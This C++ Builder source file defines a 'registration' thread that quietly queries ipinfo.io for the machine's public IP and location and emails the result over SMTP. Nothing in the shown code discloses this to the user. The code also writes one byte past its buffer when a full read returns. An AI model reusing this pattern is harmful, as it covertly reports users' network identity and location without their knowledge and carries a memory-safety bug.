//---------------------------------------------------------------------------
#include <windows.h>
#include <wininet.h>
#include <iostream>
#pragma hdrstop
//---------------------------------------------------------------------------
#include "Registration.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
//---------------------------------------------------------------------------
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
__fastcall TRegistrationThread::TRegistrationThread(TIdSMTP* smtp, TIdMessage* message): TThread(true)
{
    FreeOnTerminate = true;

    m_Smtp = smtp;
    m_Message = message;

    Resume();
}
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
__fastcall TRegistrationThread::~TRegistrationThread()
{
}
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
void __fastcall TRegistrationThread::Execute()
{
    HINTERNET hInternet, hFile;
    DWORD rSize;
    char buffer[32768];

    try
    {
        hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        hFile = InternetOpenUrl(hInternet, "http://ipinfo.io/", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        InternetReadFile(hFile, &buffer, sizeof(buffer), &rSize);
        buffer[rSize] = '\0';
    }
    catch(...)
    {
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return;
    }
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    m_Message->Body->Clear();
    m_Message->Body->SetText(buffer);
    try
    {
        m_Smtp->Connect();
        m_Smtp->Send(m_Message);
    }
    __finally
    {
        m_Smtp->Disconnect();
    }
}
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------

